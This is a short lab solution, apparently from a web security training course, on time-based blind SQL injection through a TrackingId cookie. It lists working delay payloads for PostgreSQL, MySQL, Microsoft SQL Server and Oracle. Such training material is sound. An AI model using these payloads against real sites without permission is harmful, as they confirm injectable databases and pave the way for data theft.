# Lab: Blind SQL injection with time delays (Practitioner)

**Goal:** Cause a time delay to prove the injection works (usually 10 seconds).

## Technique

Time-based blind SQLi using `SLEEP()`, `pg_sleep()`, or `WAITFOR DELAY` depending on the database.

## Common Payloads

**PostgreSQL (most common in this lab):**

```
'; SELECT pg_sleep(10)--
```

**MySQL:**

```
'; SELECT SLEEP(10)--
```

**Microsoft:**

```
'; WAITFOR DELAY '0:0:10'--
```

**Oracle:**

```
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--
```

## Solution

Inject the appropriate time-delay payload into the TrackingId cookie. If the response takes ~10 seconds, the lab is solved.
